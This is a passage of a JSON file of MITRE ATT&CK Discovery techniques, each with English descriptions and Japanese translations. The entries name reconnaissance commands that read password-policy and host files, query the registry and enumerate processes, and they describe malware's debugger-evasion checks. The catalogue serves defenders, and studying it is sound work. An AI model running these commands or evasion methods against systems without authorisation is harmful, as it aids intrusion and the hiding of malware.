                "description_jp": "攻撃者は、有用なデータを見つけるためにシステムおよびサービスログを列挙する可能性があります。これらのログは、ユーザー認証記録（[アカウントディスカバリ](https://attack.mitre.org/techniques/T1087)）、セキュリティまたは脆弱なソフトウェア（[ソフトウェアディスカバリ](https://attack.mitre.org/techniques/T1518)）、または侵害されたネットワーク内のホスト（[リモートシステムディスカバリ](https://attack.mitre.org/techniques/T1018)）など、攻撃者にとってさまざまな種類の貴重な洞察を浮き彫りにする可能性があります。\n\nホストバイナリを利用してシステムログを収集することができます。例としては、Windowsで`wevtutil.exe`や[PowerShell](https://attack.mitre.org/techniques/T1059/001)を使用してセキュリティイベント情報にアクセスしたりエクスポートしたりすることが挙げられます。(引用: WithSecure Lazarus-NoPineapple Threat Intel Report 2023)(引用: Cadet Blizzard emerges as novel threat actor) クラウド環境では、攻撃者はAzure VM Agentの`CollectGuestLogs.exe`などのユーティリティを利用して、クラウドホスト型インフラストラクチャからセキュリティログを収集する可能性があります。(引用: SIM Swapping and Abuse of the Microsoft Azure Serial Console)\n\n攻撃者はまた、SIEMなどの集中ログ記録インフラストラクチャを標的にする可能性があります。ログはまた、オフライン分析のために一括エクスポートされ、攻撃者が制御するインフラストラクチャに送信される場合もあります。\n\n環境をよりよく理解することに加えて、攻撃者はインシデント対応手順をリアルタイムで追跡するためにログを監視することもあります。これにより、永続性を維持したり防御を回避したりするためにテクニックを調整できる可能性があります。(引用: Permiso GUI-Vil 2023)",
                "subtechniques": []
            },
            {
                "id": "T1057",
                "name_eng": "Process Discovery",
                "name_jp": "プロセス探索",
                "description_eng": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)",
                "description_jp": "攻撃者は、システム上で実行中のプロセスに関する情報を取得しようとする可能性があります。取得された情報は、ネットワーク内のシステムで実行されている一般的なソフトウェア/アプリケーションを理解するために使用できます。管理者またはその他の昇格されたアクセス権により、より詳細なプロセス情報を取得できる場合があります。攻撃者は、自動検出中に[プロセスディスカバリ](https://attack.mitre.org/techniques/T1057)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうか、および/または特定のアクションを試みるかどうかなど、その後の行動を形成する可能性があります。\n\nWindows環境では、攻撃者は[cmd](https://attack.mitre.org/software/S0106)を介した[Tasklist](https://attack.mitre.org/software/S0057)ユーティリティ、または[PowerShell](https://attack.mitre.org/techniques/T1059/001)を介した<code>Get-Process</code>を使用して、実行中のプロセスに関する詳細を取得できます。プロセスに関する情報は、<code>CreateToolhelp32Snapshot</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)呼び出しの出力からも抽出できます。MacおよびLinuxでは、これは<code>ps</code>コマンドで実行されます。攻撃者はまた、`/proc`を介してプロセスを列挙することを選択する場合があります。ESXiも、<code>ps</code>コマンドおよび<code>esxcli system process list</code>の使用をサポートしています。(引用: Sygnia ESXi Ransomware 2025)(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)\n\nネットワークデバイスでは、<code>show processes</code>などの[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを使用して、現在実行中のプロセスを表示できます。(引用: US-CERT-TA18-106A)(引用: show_processes_cisco_cmd)",
                "subtechniques": []
            },
            {
                "id": "T1201",
                "name_eng": "Password Policy Discovery",
                "name_jp": "パスワードポリシーの探索",
                "description_eng": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).",
                "description_jp": "攻撃者は、エンタープライズネットワークまたはクラウド環境内で使用されているパスワードポリシーに関する詳細情報にアクセスしようとする可能性があります。パスワードポリシーは、[ブルートフォース](https://attack.mitre.org/techniques/T1110)によって推測または解読が困難な複雑なパスワードを強制する方法です。この情報は、攻撃者が一般的なパスワードのリストを作成し、ポリシーに準拠した辞書攻撃および/またはブルートフォース攻撃を開始するのに役立つ可能性があります（例：最小パスワード長が8の場合、「pass123」などのパスワードは試行しない。アカウントをロックアウトしないように、ロックアウトが6に設定されている場合はアカウントごとに3〜4個を超えるパスワードはチェックしない）。\n\nパスワードポリシーは、<code>net accounts (/domain)</code>、<code>Get-ADDefaultDomainPasswordPolicy</code>、<code>chage -l <username></code>、<code>cat /etc/pam.d/common-password</code>、<code>pwpolicy getaccountpolicies</code>など、さまざまなコマンドシェルユーティリティを介してWindows、Linux、macOSシステムで設定および検出できます。(引用: Superuser Linux Password Policies)(引用: Jamf User Password Policies) 攻撃者はまた、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を利用してパスワードポリシー情報を検出する（例：<code>show aaa</code>、<code>show aaa common-criteria policy all</code>）可能性があります。(引用: US-CERT-TA18-106A)\n\nパスワードポリシーは、AWSの<code>GetAccountPasswordPolicy</code>など、利用可能なAPIを使用してクラウド環境で検出できます。(引用：AWS GetPasswordPolicy)",
                "subtechniques": []
            },
            {
                "id": "T1012",
                "name_eng": "Query Registry",
                "name_jp": "レジストリクエリ",
                "description_eng": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "description_jp": "攻撃者はWindowsレジストリと対話して、システム、構成、インストール済みソフトウェアに関する情報を収集する可能性があります。\n\nレジストリには、オペレーティングシステム、構成、ソフトウェア、セキュリティに関する大量の情報が含まれています。(引用: Wikipedia Windows Registry) 情報は[Reg](https://attack.mitre.org/software/S0075)ユーティリティを使用して簡単に照会できますが、レジストリにアクセスする他の手段も存在します。一部の情報は、攻撃者がネットワーク内で操作をさらに進めるのに役立つ場合があります。攻撃者は、自動検出中に[レジストリクエリ](https://attack.mitre.org/techniques/T1012)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうか、および/または特定のアクションを試みるかどうかなど、その後の行動を形成する可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1614",
                "name_eng": "System Location Discovery",
                "name_jp": "システムロケーションの探索",
                "description_eng": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)\n\nAdversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)",
                "description_jp": "攻撃者は、被害者ホストの地理的位置を計算するために情報を収集しようとする可能性があります。攻撃者は、自動検出中に[システムロケーションディスカバリ](https://attack.mitre.org/techniques/T1614)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうか、および/または特定のアクションを試みるかどうかなど、その後の行動を形成する可能性があります。\n\n敵対者は、タイムゾーン、キーボードレイアウト、言語設定などの様々なシステムチェックを使用して、システムの場所を推測しようとするかもしれません。(引用：FBI Ragnar Locker 2020)(引用：Sophos Geolocation 2016)(引用：Bleepingcomputer RAT malware 2020) <code>GetLocaleInfoW</code>のようなWindows API関数も、ホストのロケールを決定するために使用することができます。(引用：FBI Ragnar Locker 2020) クラウド環境では、インスタンスからインスタンスメタデータサービスにアクセスすることで、インスタンスのアベイラビリティゾーンも発見されるかもしれません。(引用：AWS Instance Identity Documents)(引用：Microsoft Azure Instance Metadata 2021)\n\n敵対者はまた、オンラインの地理位置情報IPルックアップサービスなどを介して、IPアドレッシングを使用して被害者ホストの場所を推測しようとするかもしれません。(引用：Securelist Trasparent Tribe 2020)(引用：Sophos Geolocation 2016)",
                "subtechniques": [
                    {
                        "id": "T1614.001",
                        "name_eng": "System Language Discovery",
                        "name_jp": "システム言語の探索",
                        "description_eng": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018)\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",
                        "description_jp": "攻撃者は、そのホストの地理的な場所を推測するために、被害者のシステム言語に関する情報を収集しようとする可能性があります。この情報は、攻撃者がターゲットに感染するかどうか、および/または特定のアクションを試みるかどうかなど、その後の行動を形成するために使用される場合があります。この決定は、特定の法執行機関の注意を引いたり、他のエンティティからの起訴/精査のリスクを軽減したりするために、マルウェア開発者やオペレーターによって採用される場合があります。(引用: Malware System Language Check)\n\nシステム言語を推測するために攻撃者が使用できるデータソースは、システムのデフォルトやキーボードレイアウトなど、さまざまです。特定のチェックはターゲットや攻撃者によって異なりますが、[レジストリクエリ](https://attack.mitre.org/techniques/T1012)や[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数への呼び出しなどの動作が含まれる場合があります。(引用: CrowdStrike Ryuk January 2019)\n\n例えば、Windowsシステムでは、敵対者はレジストリキー<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code>を照会したり、Windows API関数<code>GetUserDefaultUILanguage</code>、<code>GetSystemDefaultUILanguage</code>、<code>GetKeyboardLayoutList</code>、<code>GetUserDefaultLangID</code>の出力を解析したりすることで、システムの言語を推測しようとするかもしれません。(引用：Darkside Ransomware Cybereason）（引用：Securelist JSWorm）（引用：SecureList SynAck Doppelgänging May 2018）\n\nmacOSまたはLinuxシステムでは、攻撃者は<code>locale</code>を照会して<code>$LANG</code>環境変数の値を取得する可能性があります。"
                    }
                ]
            },
            {
                "id": "T1526",
                "name_eng": "Cloud Service Discovery",
                "name_jp": "クラウドサービスの探索",
                "description_eng": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).",
                "description_jp": "攻撃者は、アクセスを取得した後、システム上で実行されているクラウドサービスを列挙しようとする可能性があります。これらの方法は、Platform-as-a-Service（PaaS）からInfrastructure-as-a-Service（IaaS）またはSoftware-as-a-Service（SaaS）までさまざまです。さまざまなクラウドプロバイダー全体に多くのサービスが存在し、継続的インテグレーションと継続的デリバリー（CI/CD）、Lambda関数、Entra IDなどが含まれる場合があります。また、AWS GuardDutyやMicrosoft Defender for Cloudなどのセキュリティサービスや、AWS CloudTrailやGoogle Cloud Audit Logsなどのログ記録サービスも含まれる場合があります。\n\n攻撃者は、環境全体で有効になっているサービスに関する情報を発見しようとする可能性があります。Microsoft Graph APIやAzure Resource Manager APIなどのAzureツールとAPIは、アプリケーション、管理グループ、リソースとポリシー定義、およびIDによってアクセス可能なそれらの関係など、リソースとサービスを列挙できます。(引用: Azure - Resource Manager API)(引用: Azure AD Graph API)\n\n例えば、StormspotterはAzureリソースとサービスのグラフを列挙して構築するためのオープンソースツールであり、Pacuはクラウドサービスを発見するためのいくつかのメソッドをサポートするオープンソースAWSエクスプロイトフレームワークです。(引用: Azure - Stormspotter)(引用: GitHub Pacu)\n\n敵対者は、得られた情報を使用して、列挙されたサービスからのデータや資格情報を標的にしたり、[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)や[クラウドログの無効化または変更](https://attack.mitre.org/techniques/T1562/008)を通じて特定された防御を回避したりするなど、その後の行動を形成する可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1018",
                "name_eng": "Remote System Discovery",
                "name_jp": "リモートシステムの探索",
                "description_eng": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)",
                "description_jp": "攻撃者は、現在のシステムからの横方向の移動に使用できる可能性のあるネットワーク上のIPアドレス、ホスト名、またはその他の論理識別子によって、他のシステムのリストを取得しようとする可能性があります。これを可能にする機能はリモートアクセスツール内に存在する可能性がありますが、オペレーティングシステムで利用可能なユーティリティ（[Ping](https://attack.mitre.org/software/S0097)、[Net](https://attack.mitre.org/software/S0039)を使用した<code>net view</code>、またはESXiサーバー上の<code>esxcli network diag ping</code>など）も使用できます。\n\n敵対者はまた、環境内のリモートシステムの存在を発見するために、ローカルホストファイル（例：<code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code>または<code>/etc/hosts</code>）からのデータやその他の受動的な手段（ローカル[Arp](https://attack.mitre.org/software/S0099)キャッシュエントリなど）を分析する可能性があります。\n\n攻撃者はまた、ネットワークインフラストラクチャの発見を標的にしたり、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを利用してネットワーク内のシステムに関する詳細情報を収集したり（例：<code>show cdp neighbors</code>、<code>show arp</code>）する可能性があります。(引用: US-CERT-TA18-106A)(引用: CISA AR21-126A FIVEHANDS May 2021)",
                "subtechniques": []
            },
            {
                "id": "T1046",
                "name_eng": "Network Service Discovery",
                "name_jp": "ネットワークサービスの探索",
                "description_eng": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)",
                "description_jp": "攻撃者は、リモートホストやローカルネットワークインフラストラクチャデバイスで実行されているサービス（リモートソフトウェアの悪用に対して脆弱な可能性のあるものを含む）のリストを取得しようとする可能性があります。この情報を取得する一般的な方法には、システムに持ち込まれたツールを使用したポートスキャン、脆弱性スキャン、および/またはワードリストスキャンが含まれます。(引用: CISA AR21-126A FIVEHANDS May 2021)\n\nクラウド環境内では、攻撃者は他のクラウドホストで実行されているサービスを発見しようとする可能性があります。さらに、クラウド環境がオンプレミス環境に接続されている場合、攻撃者はクラウド以外のシステムで実行されているサービスも特定できる可能性があります。\n\nmacOS環境内では、攻撃者はネイティブのBonjourアプリケーションを使用して、ネットワーク内の他のmacOSホストで実行されているサービスを発見する可能性があります。Bonjour mDNSResponderデーモンは、ホストの登録済みサービスをネットワーク上で自動的に登録およびアドバタイズします。例えば、攻撃者はmDNSクエリ（<code>dns-sd -B _ssh._tcp .</code>など）を使用して、sshサービスをブロードキャストしている他のシステムを見つけることができます。(引用: apple doco bonjour description)(引用: macOS APT Activity Bradley)",
                "subtechniques": []
            },
            {
                "id": "T1518",
                "name_eng": "Software Discovery",
                "name_jp": "ソフトウェアの探索",
                "description_eng": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072), and may allow adversaries broad access to infect devices or move laterally.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
                "description_jp": "攻撃者は、システムまたはクラウド環境にインストールされているソフトウェアおよびソフトウェアバージョンのリストを取得しようとする可能性があります。攻撃者は、自動検出中に[ソフトウェアディスカバリ](https://attack.mitre.org/techniques/T1518)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうか、および/または特定のアクションを試みるかどうかなど、その後の行動を形成する可能性があります。\n\nそのようなソフトウェアは、構成管理またはセキュリティ上の理由から環境全体に広く展開されている可能性があり、例えば[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)などがあり、攻撃者がデバイスに感染させたり横方向に移動したりするための広範なアクセスを許可する可能性があります。\n\n攻撃者は、存在するセキュリティ対策を把握したり、侵害されたシステムに[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)に対して脆弱なバージョンのソフトウェアがあるかどうかを判断したりするなど、さまざまな理由でソフトウェアを列挙しようとする可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1518.001",
                        "name_eng": "Security Software Discovery",
                        "name_jp": "セキュリティソフトウェアの探索",
                        "description_eng": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
                        "description_jp": "攻撃者は、システムまたはクラウド環境にインストールされているセキュリティソフトウェア、構成、防御ツール、センサーのリストを取得しようとする可能性があります。これには、クラウド監視エージェントやウイルス対策ソフトなどが含まれる場合があります。攻撃者は、自動検出中に[セキュリティソフトウェアディスカバリ](https://attack.mitre.org/techniques/T1518/001)からの情報を使用して、攻撃者がターゲットを完全に感染させるかどうか、および/または特定のアクションを試みるかどうかなど、その後の行動を形成する可能性があります。\n\nセキュリティソフトウェア情報を取得するために使用できるコマンドの例としては、[netsh](https://attack.mitre.org/software/S0108)、[Reg](https://attack.mitre.org/software/S0075)を使用した<code>reg query</code>、[cmd](https://attack.mitre.org/software/S0106)を使用した<code>dir</code>、[Tasklist](https://attack.mitre.org/software/S0057)などがありますが、ディスカバリ動作の他のインジケータは、攻撃者が探しているソフトウェアまたはセキュリティシステムの種類に固有である可能性があります。macOSマルウェアがLittleSnitchおよびKnockKnockソフトウェアのチェックを実行するのがより一般的になりつつあります。\n\n敵対者はまた、AWS CloudWatchエージェント、Azure VMエージェント、Google Cloud Monitorエージェントなど、コンピューティングインフラストラクチャにインストールされたクラウドネイティブのセキュリティソフトウェアを発見するために[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)を利用するかもしれない。これらのエージェントはVMからメトリクスやログを収集し、クラウドベースの監視プラットフォームに集約されるかもしれない。"
                    }
                ]
            },
            {
                "id": "T1538",
                "name_eng": "Cloud Service Dashboard",
                "name_jp": "クラウドサービスダッシュボード",
                "description_eng": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, review findings of potential security risks, and run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This also allows the adversary to gain information without manually making any API requests.",
                "description_jp": "攻撃者は、盗まれた認証情報を使用してクラウドサービスダッシュボードGUIを使用し、特定のサービス、リソース、機能など、運用中のクラウド環境から有用な情報を取得する可能性があります。例えば、GCPコマンドセンターを使用して、すべてのアセットを表示したり、潜在的なセキュリティリスクの調査結果を確認したり、パブリックIPアドレスやオープンポートの検索など、追加のクエリを実行したりできます。(引用: Google Command Center Dashboard)\n\n環境の構成によっては、攻撃者はAPIよりもグラフィカルダッシュボードを介してより多くの情報を列挙できる場合があります。これにより、攻撃者は手動でAPIリクエストを行うことなく情報を取得することもできます。",
                "subtechniques": []
            },
            {
                "id": "T1622",
                "name_eng": "Debugger Evasion",
                "name_jp": "デバッガ回避",
                "description_eng": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)\n\nMalware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue.(Citation: Apriorit)\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)",
                "description_jp": "攻撃者は、デバッガを検出して回避するためにさまざまな手段を用いる可能性があります。デバッガは通常、防御側が潜在的なマルウェアペイロードの実行をトレースおよび/または分析するために使用します。(引用: ProcessHacker Github)\n\nデバッガ回避には、デバッグ環境を示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)と同様に、攻撃者がデバッガを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にデバッgaーアーティファクトを検索することもあります。\n\n特定のチェックは、ターゲットおよび/または敵対者によって異なります。Windowsでは、これには<code>IsDebuggerPresent()</code>や<code>NtQueryInformationProcess()</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数呼び出し、またはプロセス環境ブロック（PEB）の<code>BeingDebugged</code>フラグの手動チェックが含まれる場合があります。Linuxでは、これには`/proc/self/status`の<code>TracerPID</code>フィールドのクエリが含まれる場合があり、これはプロセスが動的分析ツールによってトレースされているかどうかを示します。(引用: Cado Security P2PInfect 2023)(引用: Positive Technologies Hellhounds 2023) デバッグアーティファクトの他のチェックでは、ハードウェアブレークポイント、割り込みアセンブリオペコード、時間チェック、または現在のプロセスで例外が発生した場合の測定（存在するデバッガーが潜在的なエラーを「飲み込む」または処理すると仮定）を列挙しようとする場合もあります。(引用: hasherezade debug)(引用: AlKhaser Debug)(引用: vxunderground debug)\n\nマルウェアはまた、構造化例外処理（SEH）を利用して、例外をスローし、プロセスが中断されているかどうかを検出することにより、デバッガーを検出する可能性があります。SEHはハードウェアとソフトウェアの両方の期待値を処理し、デバッグのサポートを含む例外の制御を提供します。デバッガーが存在する場合、プログラムの制御はデバッガーに移り、コードの実行は中断されます。デバッガーが存在しない場合、制御はSEHハンドラーに移り、例外を自動的に処理してプログラムの実行を継続させます。(引用: Apriorit)\n\n攻撃者は、これらのデバッガチェックから学習した情報を自動検出中に使用して、その後の動作を形成する可能性があります。デバッガはまた、プロセスを切り離したり、<code>OutputDebugStringW()</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数呼び出しをループさせることによって生成されるメッセージを介してデバッグログを無意味なデータであふれさせたりすることによって回避できます。(引用: wardle evilquest partii)(引用: Checkpoint Dridex Jan 2021)",
                "subtechniques": []
            },
            {
                "id": "T1124",
                "name_eng": "System Time Discovery",
                "name_jp": "システム時刻の探索",
